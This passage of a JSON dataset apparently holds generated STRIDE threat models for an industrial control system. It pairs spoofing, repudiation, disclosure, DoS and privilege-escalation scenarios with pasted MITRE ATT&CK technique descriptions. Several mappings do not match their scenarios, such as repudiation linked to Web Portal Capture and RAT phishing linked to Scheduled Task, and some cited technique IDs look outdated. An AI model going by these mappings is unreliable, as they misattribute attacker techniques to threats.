            "Scenario": "An attacker alters data streams being transmitted to cloud services to generate false analytics.",
            "Assumptions": [
                {
                    "Assumption": "Data streams are not encrypted during transmission.",
                    "Role": "System Architect",
                    "Condition": "Valid if encryption protocols like TLS are not in use."
                },
                {
                    "Assumption": "The attacker has access to the network traffic between the gateway and cloud.",
                    "Role": "Attacker",
                    "Condition": "Valid if network monitoring and encryption are insufficient."
                }
            ],
            "Potential Impact": "False analytics affect decision-making and operational efficiency.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "data stream",
                "cloud",
                "analytics",
                "data integrity"
            ],
            "mitre_technique": {
                "name": "Network Sniffing",
                "description": "Adversaries may passively sniff network traffic to capture information about an environment, including authentication material passed over the network. Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection. An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.\n\nData captured via this technique may include user credentials, especially those sent over an insecure, unencrypted protocol. Techniques for name service resolution poisoning, such as [LLMNR/NBT-NS Poisoning and SMB Relay](https://attack.mitre.org/techniques/T1557/001), can also be used to capture credentials to websites, proxies, and internal systems by redirecting traffic to an adversary.\n\nNetwork sniffing may reveal configuration details, such as running services, version numbers, and other network characteristics (e.g. IP addresses, hostnames, VLAN IDs) necessary for subsequent [Lateral Movement](https://attack.mitre.org/tactics/TA0008) and/or [Defense Evasion](https://attack.mitre.org/tactics/TA0005) activities. Adversaries may likely also utilize network sniffing during [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) (AiTM) to passively gain additional knowledge about the environment.\n\nIn cloud-based environments, adversaries may still be able to use traffic mirroring services to sniff network traffic from virtual machines. For example, AWS Traffic Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define specified instances to collect traffic from and specified targets to send collected traffic to.(Citation: AWS Traffic Mirroring)(Citation: GCP Packet Mirroring)(Citation: Azure Virtual Network TAP) Often, much of this traffic will be in cleartext due to the use of TLS termination at the load balancer level to reduce the strain of encrypting and decrypting traffic.(Citation: Rhino Security Labs AWS VPC Traffic Mirroring)(Citation: SpecterOps AWS Traffic Mirroring) The adversary can then use exfiltration techniques such as Transfer Data to Cloud Account in order to access the sniffed traffic.(Citation: Rhino Security Labs AWS VPC Traffic Mirroring)\n\nOn network devices, adversaries may perform network captures using [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `monitor capture`.(Citation: US-CERT-TA18-106A)(Citation: capture_embedded_packet_on_software)",
                "id": "attack-pattern--3257eb21-f9a7-4430-8de1-d8b6e288f529",
                "technique_id": "T1040"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An employee denies issuing certain commands through the Control Center.",
            "Assumptions": [
                {
                    "Assumption": "There is no non-repudiation mechanism in place.",
                    "Role": "System Architect",
                    "Condition": "Valid if actions are not logged with timestamps and unique user identifiers."
                },
                {
                    "Assumption": "Operators have shared or weak credentials.",
                    "Role": "Operator",
                    "Condition": "Valid if using shared accounts or simple passwords."
                }
            ],
            "Potential Impact": "Accountability is blurred, complicating incident response and investigations.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "control commands",
                "logging",
                "non-repudiation",
                "user accountability"
            ],
            "mitre_technique": {
                "name": "Web Portal Capture",
                "description": "Adversaries may install code on externally facing portals, such as a VPN login page, to capture and transmit credentials of users who attempt to log into the service. For example, a compromised login page may log provided user credentials before logging the user in to the service.\n\nThis variation on input capture may be conducted post-compromise using legitimate administrative access as a backup measure to maintain network access through [External Remote Services](https://attack.mitre.org/techniques/T1133) and [Valid Accounts](https://attack.mitre.org/techniques/T1078) or as part of the initial compromise by exploitation of the externally facing web service.(Citation: Volexity Virtual Private Keylogging)",
                "id": "attack-pattern--69e5226d-05dc-4f15-95d7-44f5ed78d06e",
                "technique_id": "T1056.003"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A contractor denies responsibility for an unauthorized database access.",
            "Assumptions": [
                {
                    "Assumption": "Actions are not logged with unique identifiers.",
                    "Role": "System Administrator",
                    "Condition": "Valid if logging does not include unique user or process IDs."
                },
                {
                    "Assumption": "Database access is not restricted and monitored.",
                    "Role": "Database Administrator",
                    "Condition": "Valid if database policies are lax."
                }
            ],
            "Potential Impact": "Sensitive data handling may be disputed, affecting data confidentiality and trust.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "database",
                "access control",
                "logs",
                "identity management"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies uploading malicious software to the HMI system.",
            "Assumptions": [
                {
                    "Assumption": "Upload actions are not properly logged.",
                    "Role": "System Administrator",
                    "Condition": "Valid if event logs do not capture uploads."
                },
                {
                    "Assumption": "The HMI fails to authenticate and log user actions.",
                    "Role": "System Architect",
                    "Condition": "Valid if HMI lacks user action auditing."
                }
            ],
            "Potential Impact": "Malicious activity may go unpunished, leading to future security breaches.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "malware",
                "HMI",
                "logging",
                "authentication"
            ],
            "mitre_technique": {
                "name": "Indicator Removal from Tools",
                "description": "If a malicious tool is detected and quarantined or otherwise curtailed, an adversary may be able to determine why the malicious tool was detected (the indicator), modify the tool by removing the indicator, and use the updated version that is no longer detected by the target's defensive systems or subsequent targets that may use similar systems.\n\nA good example of this is when malware is detected with a file signature and quarantined by anti-virus software. An adversary who can determine that the malware was quarantined because of its file signature may use [Software Packing](https://attack.mitre.org/techniques/T1045) or otherwise modify the file so it has a different signature, and then re-use the malware.",
                "id": "attack-pattern--00d0b012-8a03-410e-95de-5826bf542de6",
                "technique_id": "T1066"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive operational data is exposed due to unencrypted storage on the cloud.",
            "Assumptions": [
                {
                    "Assumption": "Cloud storage does not encrypt data at rest.",
                    "Role": "System Architect",
                    "Condition": "Valid if the cloud provider or configuration does not enforce encryption."
                },
                {
                    "Assumption": "Access controls on cloud storage are weak.",
                    "Role": "Cloud Administrator",
                    "Condition": "Valid if role-based access and least privilege principles are not applied."
                }
            ],
            "Potential Impact": "Data confidentiality is compromised, potentially leading to industrial espionage.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "cloud storage",
                "encryption",
                "data confidentiality"
            ],
            "mitre_technique": {
                "name": "Data from Cloud Storage",
                "description": "Adversaries may access data from cloud storage.\n\nMany IaaS providers offer solutions for online data object storage such as Amazon S3, Azure Storage, and Google Cloud Storage. Similarly, SaaS enterprise platforms such as Office 365 and Google Workspace provide cloud-based document storage to users through services such as OneDrive and Google Drive, while SaaS application providers such as Slack, Confluence, Salesforce, and Dropbox may provide cloud storage solutions as a peripheral or primary use case of their platform. \n\nIn some cases, as with IaaS-based cloud storage, there exists no overarching application (such as SQL or Elasticsearch) with which to interact with the stored objects: instead, data from these solutions is retrieved directly though the [Cloud API](https://attack.mitre.org/techniques/T1059/009). In SaaS applications, adversaries may be able to collect this data directly from APIs or backend cloud storage objects, rather than through their front-end application or interface (i.e., [Data from Information Repositories](https://attack.mitre.org/techniques/T1213)). \n\nAdversaries may collect sensitive data from these cloud storage solutions. Providers typically offer security guides to help end users configure systems, though misconfigurations are a common problem.(Citation: Amazon S3 Security, 2019)(Citation: Microsoft Azure Storage Security, 2019)(Citation: Google Cloud Storage Best Practices, 2019) There have been numerous incidents where cloud storage has been improperly secured, typically by unintentionally allowing public access to unauthenticated users, overly-broad access by all users, or even access for any anonymous person outside the control of the Identity Access Management system without even needing basic user permissions.\n\nThis open access may expose various types of sensitive data, such as credit cards, personally identifiable information, or medical records.(Citation: Trend Micro S3 Exposed PII, 2017)(Citation: Wired Magecart S3 Buckets, 2019)(Citation: HIPAA Journal S3 Breach, 2017)(Citation: Rclone-mega-extortion_05_2021)\n\nAdversaries may also obtain then abuse leaked credentials from source repositories, logs, or other means as a way to gain access to cloud storage objects.",
                "id": "attack-pattern--3298ce88-1628-43b1-87d9-0b5336b193d7",
                "technique_id": "T1530"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker intercepts communication between field devices and the gateway.",
            "Assumptions": [
                {
                    "Assumption": "Data is transmitted in plaintext.",
                    "Role": "System Architect",
                    "Condition": "Valid if protective measures like TLS are not implemented."
                },
                {
                    "Assumption": "The attacker has access to the network or communication channel.",
                    "Role": "Attacker",
                    "Condition": "Valid if the network is not segmented or protected."
                }
            ],
            "Potential Impact": "Operational data and command integrity are at risk, affecting both data confidentiality and integrity.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "network traffic",
                "field devices",
                "gateway",
                "interception"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "A compromised cloud service reveals sensitive analytics outcomes to unauthorized users.",
            "Assumptions": [
                {
                    "Assumption": "Cloud services do not enforce strict access controls.",
                    "Role": "Cloud Administrator",
                    "Condition": "Valid if role-based access and multi-factor authentication are not implemented."
                },
                {
                    "Assumption": "Security monitoring is inadequate.",
                    "Role": "Security Analyst",
                    "Condition": "Valid if security monitoring and alerting are not thorough."
                }
            ],
            "Potential Impact": "Analytics outcomes containing proprietary information are exposed, risking competitive advantage.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "cloud service",
                "analytics data",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "Cloud Service Discovery",
                "description": "An adversary may attempt to enumerate the cloud services running on a system after gaining access. These methods can differ from platform-as-a-service (PaaS), to infrastructure-as-a-service (IaaS), or software-as-a-service (SaaS). Many services exist throughout the various cloud providers and can include Continuous Integration and Continuous Delivery (CI/CD), Lambda Functions, Azure AD, etc. They may also include security services, such as AWS GuardDuty and Microsoft Defender for Cloud, and logging services, such as AWS CloudTrail and Google Cloud Audit Logs.\n\nAdversaries may attempt to discover information about the services enabled throughout the environment. Azure tools and APIs, such as the Azure AD Graph API and Azure Resource Manager API, can enumerate resources and services, including applications, management groups, resources and policy definitions, and their relationships that are accessible by an identity.(Citation: Azure - Resource Manager API)(Citation: Azure AD Graph API)\n\nFor example, Stormspotter is an open source tool for enumerating and constructing a graph for Azure resources and services, and Pacu is an open source AWS exploitation framework that supports several methods for discovering cloud services.(Citation: Azure - Stormspotter)(Citation: GitHub Pacu)\n\nAdversaries may use the information gained to shape follow-on behaviors, such as targeting data or credentials from enumerated services or evading identified defenses through [Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001) or [Disable or Modify Cloud Logs](https://attack.mitre.org/techniques/T1562/008).",
                "id": "attack-pattern--e24fcba8-2557-4442-a139-1ee2f2e784db",
                "technique_id": "T1526"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker floods the WAN with requests, disrupting communication between the Control Center and RTUs.",
            "Assumptions": [
                {
                    "Assumption": "The WAN lacks proper rate-limiting controls.",
                    "Role": "Network Engineer",
                    "Condition": "Valid if rate-limiting controls are not implemented."
                },
                {
                    "Assumption": "The attacker can generate a high volume of traffic.",
                    "Role": "Attacker",
                    "Condition": "Valid if the attacker has sufficient network resources."
                }
            ],
            "Potential Impact": "Communication breakdown affects operational availability and control over field devices.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "WAN",
                "network flood",
                "communication disruption"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker overloads the gateway with malformed requests, causing it to crash.",
            "Assumptions": [
                {
                    "Assumption": "The gateway lacks input validation for incoming requests.",
                    "Role": "System Architect",
                    "Condition": "Valid if request validation mechanisms are not in place."
                },
                {
                    "Assumption": "Security monitoring does not detect unusual activity.",
                    "Role": "Security Analyst",
                    "Condition": "Valid if intrusion detection systems are insufficient."
                }
            ],
            "Potential Impact": "Data flow between field devices and cloud services is interrupted, affecting operational efficiency.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "gateway",
                "input validation",
                "system crash"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "A DDoS attack targets the cloud services, rendering them unavailable for data processing and storage.",
            "Assumptions": [
                {
                    "Assumption": "Cloud services do not have adequate DDoS protection.",
                    "Role": "Cloud Provider",
                    "Condition": "Valid if robust DDoS mitigation strategies are not implemented."
                },
                {
                    "Assumption": "The attacker coordinates a large-scale attack.",
                    "Role": "Attacker",
                    "Condition": "Valid if the attacker has access to a large botnet."
                }
            ],
            "Potential Impact": "Cloud service unavailability impacts real-time data processing, storage, and analytics.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "DDoS",
                "cloud services",
                "availability",
                "botnet"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a vulnerability in the MES to gain administrative access.",
            "Assumptions": [
                {
                    "Assumption": "The MES software contains unpatched vulnerabilities.",
                    "Role": "System Administrator",
                    "Condition": "Valid if patch management practices are not enforced."
                },
                {
                    "Assumption": "The attacker has access to the network where the MES is hosted.",
                    "Role": "Attacker",
                    "Condition": "Valid if network segmentation and access controls are weak."
                }
            ],
            "Potential Impact": "Compromise of administrative controls leads to potential data manipulation and disruption of production workflows.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "vulnerability exploit",
                "MES",
                "administrative access"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "A malicious insider escalates their privileges within the Control Center system.",
            "Assumptions": [
                {
                    "Assumption": "Insider has legitimate access to lower privilege accounts.",
                    "Role": "Insider",
                    "Condition": "Valid if least privilege principles are not strictly enforced."
                },
                {
                    "Assumption": "Security logs and monitoring do not detect privilege escalation.",
                    "Role": "Security Analyst",
                    "Condition": "Valid if security monitoring systems are not effective."
                }
            ],
            "Potential Impact": "Escalated access permissions can lead to unauthorized system control and data access.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "insider threat",
                "control center",
                "privilege escalation"
            ],
            "mitre_technique": {
                "name": "File System Permissions Weakness",
                "description": "Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.\n\n### Services\n\nManipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.\n\n### Executable Installers\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038). Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088). Several examples of this weakness in existing common installers have been reported to software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)",
                "id": "attack-pattern--0ca7beef-9bbc-4e35-97cf-437384ddce6a",
                "technique_id": "T1044"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker uses a phishing email to deliver a remote access trojan (RAT), gaining higher access levels.",
            "Assumptions": [
                {
                    "Assumption": "Users can be tricked into opening phishing emails.",
                    "Role": "User",
                    "Condition": "Valid if there is no user training or awareness."
                },
                {
                    "Assumption": "Email security measures are insufficient.",
                    "Role": "System Administrator",
                    "Condition": "Valid if email filtering and sandboxing are not implemented."
                }
            ],
            "Potential Impact": "RAT installation allows the attacker to move laterally and escalate privileges within the network.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "phishing",
                "RAT",
                "remote access",
                "escalation"
            ],
            "mitre_technique": {
                "name": "Scheduled Task",
                "description": "Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. The [schtasks](https://attack.mitre.org/software/S0111) utility can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel. In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library to create a scheduled task.\n\nThe deprecated [at](https://attack.mitre.org/software/S0110) utility could also be abused by adversaries (ex: [At](https://attack.mitre.org/techniques/T1053/002)), though <code>at.exe</code> can not access tasks created with <code>schtasks</code> or the Control Panel.\n\nAn adversary may use Windows Task Scheduler to execute programs at system startup or on a scheduled basis for persistence. The Windows Task Scheduler can also be abused to conduct remote Execution as part of Lateral Movement and/or to run a process under the context of a specified account (such as SYSTEM). Similar to [System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218), adversaries have also abused the Windows Task Scheduler to potentially mask one-time execution under signed/trusted system processes.(Citation: ProofPoint Serpent)\n\nAdversaries may also create \"hidden\" scheduled tasks (i.e. [Hide Artifacts](https://attack.mitre.org/techniques/T1564)) that may not be visible to defender tools and manual queries used to enumerate tasks. Specifically, an adversary may hide a task from `schtasks /query` and the Task Scheduler by deleting the associated Security Descriptor (SD) registry value (where deletion of this value must be completed using SYSTEM permissions).(Citation: SigmaHQ)(Citation: Tarrask scheduled task) Adversaries may also employ alternate methods to hide tasks, such as altering the metadata (e.g., `Index` value) within associated registry keys.(Citation: Defending Against Scheduled Task Attacks in Windows Environments) ",
                "id": "attack-pattern--005a06c6-14bf-4118-afa0-ebcd8aebb0c9",
                "technique_id": "T1053.005"
            }
        }
    ]
},
{
    "case_number": "4",
    "batch_number": "19",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "Spoofed Remote Terminal Unit (RTU) sends falsified data to the control center.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can gain network access to the RTU communication pathway.",
                    "Role": "Attacker",
                    "Condition": "Valid given poor network security measures."
                },
                {
                    "Assumption": "The system lacks mutual authentication between the control center and RTUs.",
                    "Role": "System Design",
                    "Condition": "When mutual authentication is not enforced."
                },
                {
                    "Assumption": "The attacker can obtain or fabricate the credentials or identifiers for the RTU.",
                    "Role": "Attacker",
                    "Condition": "If credentials or identifiers are weak or improperly protected."
                }
            ],
            "Potential Impact": "Corruption of operational data and process mismanagement.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "network",
                "device",
                "credential access",
                "man-in-the-middle"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "Attacker spoofs a cloud service endpoint to intercept data from the gateway.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can redirect traffic from the gateway to a malicious server.",
                    "Role": "Attacker",
                    "Condition": "If DNS settings are compromised or hijacked."
                },
                {
                    "Assumption": "The SSL/TLS encryption is either improperly configured or not used.",
                    "Role": "System Configuration",
                    "Condition": "When data is not securely encrypted."
                },
                {
                    "Assumption": "The attacker can deploy a phishing attack to compromise network settings.",
                    "Role": "Attacker",
                    "Condition": "If employees are not trained to recognize phishing attacks."
                }
            ],
            "Potential Impact": "Unauthorized disclosure and potential alteration of sensitive data.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "phishing",
                "network",
                "encryption",
                "DNS"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "Attacker impersonates a legitimate employee to access the HMI via social engineering.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has sufficient information about the employee and their role.",
                    "Role": "Attacker",
                    "Condition": "Given prior reconnaissance or insider aiding."
                },
                {
                    "Assumption": "The system uses weak or guessable authentication mechanisms.",
                    "Role": "System Design",
                    "Condition": "When strong authentication (e.g., multi-factor authentication) is not implemented."
                },
                {
